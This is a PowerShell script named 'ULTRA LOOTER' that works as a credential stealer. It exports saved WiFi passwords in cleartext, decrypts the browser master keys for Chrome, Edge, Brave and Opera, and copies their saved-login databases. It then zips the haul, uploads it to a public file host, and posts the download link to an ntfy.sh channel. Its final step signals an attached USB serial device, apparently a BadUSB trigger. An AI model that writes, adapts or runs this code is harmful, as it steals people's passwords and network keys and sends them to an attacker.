$topic = "data_stwealer_hideen_"
Write-Host "=== [ ULTRA LOOTER v2.3: ERROR RADAR ] ===" -ForegroundColor Cyan

# 1. Workspace Setup
$dir = "$env:TEMP\LootBox"; $zip = "$env:TEMP\package.zip"
if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }; mkdir $dir | Out-Null
if (Test-Path $zip) { Remove-Item -Force $zip }

# 2. WiFi Export
Write-Host "[*] Exporting WiFi Profiles..."
netsh wlan export profile folder=$dir key=clear | Out-Null

# 3. Chromium Decryption
$chromes = @{
    "Chrome"  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    "Edge"    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    "Brave"   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
    "Opera"   = "$env:APPDATA\Opera Software\Opera Stable\Local State"
}

foreach ($browser in $chromes.Keys) {
    $path = $chromes[$browser]
    if (Test-Path $path) {
        try {
            # Master Key Extraction
            $json = Get-Content $path -Raw -ErrorAction Stop | ConvertFrom-Json
            $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $unlockedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey[5..($encKey.Length-1)], $null, 'CurrentUser')
            [System.BitConverter]::ToString($unlockedKey) -replace '-' | Out-File "$dir\${browser}_MasterKey.txt"
            
            # Database Path Logic
            $dbPath = $path.Replace("Local State", "Default\Login Data")
            if ($browser -like "Opera*") { $dbPath = $path.Replace("Local State", "Login Data") }
            
            if (Test-Path $dbPath) {
                # Attempt an aggressive copy
                Copy-Item $dbPath -Destination "$dir\${browser}_LoginData.db" -Force -ErrorAction Stop
                Write-Host "    [+] ${browser}: Success" -ForegroundColor Green
            } else {
                Write-Host "    [!] ${browser}: Database file not found at $dbPath" -ForegroundColor Yellow
            }
        } catch { 
            # DETAILED ERROR PRINTING
            Write-Host "    [-] ${browser} Error: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "        Category: $($_.CategoryInfo.Category)" -ForegroundColor DarkRed
        }
    } else {
        Write-Host "    [?] ${browser}: Path not found ($path)" -ForegroundColor Gray
    }
}

# 4. Zipping and Uploading
Write-Host "[*] Packaging Loot..."
Add-Type -Assembly "System.IO.Compression.FileSystem"
[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)

$link = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php

if ($link -like "http*") {
    Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot Found: $link"
    Write-Host "[!] SUCCESS: $link" -ForegroundColor Green
    
    # --- THE SIGNAL ---
    $portName = (Get-PnpDevice -FriendlyName "USB Serial Device*" -Status OK).Caption | Select-String -Pattern "COM(\d+)" | ForEach-Object { $_.Matches.Value }
    if ($portName) {
        Write-Host "[*] Sending Signal to $portName..."
        cmd.exe /c "echo F > $portName"
    }
} else {
    Write-Host "[-] Upload failed. Check connection." -ForegroundColor Red
}

Write-Host "`n=== DEBUG FINISHED ===" -ForegroundColor Cyan
Read-Host "Press Enter to Clean and Exit..."
Remove-Item -Recurse -Force $dir, $zip
